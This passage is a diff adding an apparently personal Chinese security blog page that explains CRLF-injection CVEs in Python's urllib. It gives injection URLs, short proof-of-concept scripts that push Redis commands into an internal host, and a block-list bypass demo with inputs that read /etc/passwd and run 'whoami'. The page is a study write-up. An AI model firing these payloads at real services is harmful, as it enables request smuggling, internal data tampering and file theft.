@@ -1,0 +1,596 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>Python urllib CRLF注入漏洞 | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">CRLF注入漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2016-5699"><span class="toc-number">3.</span> <span class="toc-text">CVE-2016-5699</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2019-9740"><span class="toc-number">4.</span> <span class="toc-text">CVE-2019-9740</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2019-9947"><span class="toc-number">5.</span> <span class="toc-text">CVE-2019-9947</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2023-24329"><span class="toc-number">6.</span> <span class="toc-text">CVE-2023-24329</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB"><span class="toc-number">7.</span> <span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">7.1.</span> <span class="toc-text">Redis未授权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Memcached%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">7.2.</span> <span class="toc-text">Memcached未授权</span></a></li></ol></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>Python urllib CRLF注入漏洞</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/11
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/python/" style="color: #00a596">python</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">1.3k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">7分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p>
+<p><a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2020/03/09/Python-urllib-CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93">http://www.mi1k7ea.com/2020/03/09/Python-urllib-CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93</a></p>
+<span id="more"></span>
+
+<hr>
+<h1 id="CRLF注入漏洞"><a href="#CRLF注入漏洞" class="headerlink" title="CRLF注入漏洞"></a>CRLF注入漏洞</h1><p>这个已经品鉴够多了，快点端下去吧，总之就是利用 回车+换行（<code>\r\n</code>）注入自己的http请求体</p>
+<hr>
+<h1 id="CVE-2016-5699"><a href="#CVE-2016-5699" class="headerlink" title="CVE-2016-5699"></a>CVE-2016-5699</h1><p>版本：urllib2 and urllib in CPython (aka Python) before <strong>2.7.10</strong> and 3.x before <strong>3.4.4</strong></p>
+<p>注入点：<strong>IP地址和端口号的分隔符</strong>即<code>:</code>前面</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>正常报文：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/foo</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">identity</span></span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Python-urllib/3.4</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:12345</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>注入后的报文：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/foo</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">identity</span></span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Python-urllib/3.4</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span>
+<span class="token header"><span class="token header-name keyword">X-injected</span><span class="token punctuation">:</span> <span class="token header-value">header</span></span>
+<span class="token header"><span class="token header-name keyword">x-leftover</span><span class="token punctuation">:</span> <span class="token header-value">:12345</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>注：针对的是域名而非IP地址的场景进行利用的时候有个注意点，就是在域名后进行CRLF注入之前要插入一个空字符如<code>%00</code>，这样才能顺利地进行DNS查询，如<code>http://localhost%00%0d%0ax-bar:%20:12345/foo</code></p>
+<hr>
+<h1 id="CVE-2019-9740"><a href="#CVE-2019-9740" class="headerlink" title="CVE-2019-9740"></a>CVE-2019-9740</h1><p>版本：urllib2 in Python 2.x through <strong>2.7.16</strong> and urllib in Python 3.x through <strong>3.7.3</strong></p>
+<p>注入点：<strong>IP地址和端口号的分隔符</strong>即<code>:</code>前面，但是和前者的区别在于注入新的端口</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//10.10.10.10:1234?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123:8080/test/?test=a</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>poc：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
+
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> urllib
+<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>error
+<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request
+
+host <span class="token operator">=</span> <span class="token string">"192.168.10.137:7777?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123"</span>
+redis_att <span class="token operator">=</span> <span class="token string">'192.168.10.137:6379?\r\nSET hacker\r\n'</span>	<span class="token comment"># 打redis</span>
+url <span class="token operator">=</span> <span class="token string">"http://"</span> <span class="token operator">+</span> redis_att <span class="token operator">+</span> <span class="token string">":8080/test/?test=a"</span>
+
+<span class="token keyword">try</span><span class="token punctuation">:</span>
+    info <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span>
+<span class="token keyword">except</span> urllib<span class="token punctuation">.</span>error<span class="token punctuation">.</span>URLError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>注入后的报文：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/?a=1</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">X-injected</span><span class="token punctuation">:</span> <span class="token header-value">header</span></span>
+<span class="token header"><span class="token header-name keyword">TEST</span><span class="token punctuation">:</span> <span class="token header-value">123:8080/test/?test=a HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">identity</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">192.168.10.137:7777</span></span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Python-urllib/3.6</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<hr>
+<h1 id="CVE-2019-9947"><a href="#CVE-2019-9947" class="headerlink" title="CVE-2019-9947"></a>CVE-2019-9947</h1><p>版本：urllib2 in Python 2.x through <strong>2.7.16</strong> and urllib in Python 3.x through <strong>3.7.3</strong></p>
+<p>注入点：在端口号后面</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//10.10.10.10:8080/?q=HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//10.10.10.10:8080/HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>poc：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request
+
+urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'http://192.168.10.137:7777/?q=HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n'</span><span class="token punctuation">)</span>
+<span class="token comment"># urllib.request.urlopen('http://192.168.10.137:7777/HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n')</span>
+<span class="token comment"># 打内网redis</span>
+<span class="token comment"># urllib.request.urlopen('http://192.168.10.137:6379/?q=HTTP/1.1\r\nSET VULN POC\r\nHeader2:\r\n')</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>注入报文：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http">GET /?q=HTTP/1.1
+<span class="token header"><span class="token header-name keyword">Header</span><span class="token punctuation">:</span> <span class="token header-value">Value</span></span>
+<span class="token header"><span class="token header-name keyword">Header2</span><span class="token punctuation">:</span> <span class="token header-value">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">identity</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">192.168.10.137:7777</span></span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Python-urllib/3.6</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-http" data-language="http"><code class="language-http">GET /HTTP/1.1
+<span class="token header"><span class="token header-name keyword">Header</span><span class="token punctuation">:</span> <span class="token header-value">Value</span></span>
+<span class="token header"><span class="token header-name keyword">Header2</span><span class="token punctuation">:</span> <span class="token header-value">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">identity</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">192.168.10.137:7777</span></span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Python-urllib/3.6</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h1 id="CVE-2023-24329"><a href="#CVE-2023-24329" class="headerlink" title="CVE-2023-24329"></a>CVE-2023-24329</h1><p>版本：Python &lt; 3.12，Python 3.11.x &lt; 3.11.4，Python 3.10.x &lt; 3.10.12，Python 3.9.x &lt; 3.9.17，Python 3.8.x &lt; 3.8.17，Python 3.7.x &lt; 3.7.17</p>
+<p>描述：Python多个受影响版本中，当整个URL以<strong>空白字符</strong>开头时，<code>urllib.parse</code>会出现解析问题（影响主机名和方案的解析），可以通过提供以空白字符开头的URL来绕过使用阻止列表实现的任何域或协议过滤方法</p>
+<p>poc：<a target="_blank" rel="noopener" href="https://github.com/H4R335HR/CVE-2023-24329-PoC/tree/main">https://github.com/H4R335HR/CVE-2023-24329-PoC/tree/main</a></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys
+<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request
+<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparse
+
+<span class="token comment"># ANSI color codes</span>
+GREEN <span class="token operator">=</span> <span class="token string">'\033[92m'</span>
+RED <span class="token operator">=</span> <span class="token string">'\033[91m'</span>
+ENDC <span class="token operator">=</span> <span class="token string">'\033[0m'</span>
+
+explanation <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
+    In this application, we have blocked certain URL schemes and hostnames by checking urlparse(input_link).scheme and urlparse(input_link).hostname with the following list:
+    
+    block_schemes = ["file", "gopher", "expect", "php", "dict", "ftp", "glob", "data"]
+    block_host = ["instagram.com", "youtube.com", "tiktok.com"]
+    
+    Due to a flaw in how the urlparse splits the URL, you can bypass this blocklist by simply adding a leading space in the URL. Below are some URLs for you to try. Try them with and without leading spaces:
+    
+    https://youtube.com
+    file://127.0.0.1/etc/passwd
+    data://text/plain, &lt;?php phpinfo() ?>
+    expect://whoami
+    
+    Based on research by Yebo Cao - https://pointernull.com/security/python-url-parse-problem.html
+    
+    Your Python version is &#123;&#125;.
+    '''</span>
+
+<span class="token keyword">def</span> <span class="token function">is_vulnerable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    python_version <span class="token operator">=</span> sys<span class="token punctuation">.</span>version_info
+    
+    <span class="token keyword">if</span> python_version <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> python_version <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> python_version <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> python_version <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> python_version <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> python_version <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+    
+    <span class="token keyword">return</span> <span class="token boolean">True</span>
+
+<span class="token keyword">def</span> <span class="token function">safe_url_opener</span><span class="token punctuation">(</span>input_link<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    block_schemes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">,</span> <span class="token string">"gopher"</span><span class="token punctuation">,</span> <span class="token string">"expect"</span><span class="token punctuation">,</span> <span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"dict"</span><span class="token punctuation">,</span> <span class="token string">"ftp"</span><span class="token punctuation">,</span> <span class="token string">"glob"</span><span class="token punctuation">,</span> <span class="token string">"data"</span><span class="token punctuation">]</span>
+    block_host <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"instagram.com"</span><span class="token punctuation">,</span> <span class="token string">"youtube.com"</span><span class="token punctuation">,</span> <span class="token string">"tiktok.com"</span><span class="token punctuation">]</span>
+
+    input_scheme <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>input_link<span class="token punctuation">)</span><span class="token punctuation">.</span>scheme
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Input scheme is"</span><span class="token punctuation">,</span> input_scheme<span class="token punctuation">)</span>
+    input_hostname <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>input_link<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Input hostname is"</span><span class="token punctuation">,</span> input_hostname<span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> input_scheme <span class="token keyword">in</span> block_schemes<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>GREEN<span class="token operator">+</span><span class="token string">"Input scheme is forbidden"</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+
+    <span class="token keyword">if</span> input_hostname <span class="token keyword">in</span> block_host<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>GREEN<span class="token operator">+</span><span class="token string">"Input hostname is forbidden"</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        target <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>input_link<span class="token punctuation">)</span>
+        content <span class="token operator">=</span> target<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Error:"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    python_version <span class="token operator">=</span> sys<span class="token punctuation">.</span>version
+    vuln_status <span class="token operator">=</span> RED<span class="token operator">+</span><span class="token string">"vulnerable"</span><span class="token operator">+</span>ENDC <span class="token keyword">if</span> is_vulnerable<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> GREEN<span class="token operator">+</span><span class="token string">"not vulnerable"</span><span class="token operator">+</span>ENDC
+    <span class="token keyword">print</span><span class="token punctuation">(</span>explanation<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>vuln_status<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    
+    num_links <span class="token operator">=</span> <span class="token number">4</span>  <span class="token comment"># Number of times to repeat</span>
+    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num_links<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        input_link <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Enter the link: "</span><span class="token punctuation">)</span>
+        safe_url_opener<span class="token punctuation">(</span>input_link<span class="token punctuation">)</span>
+
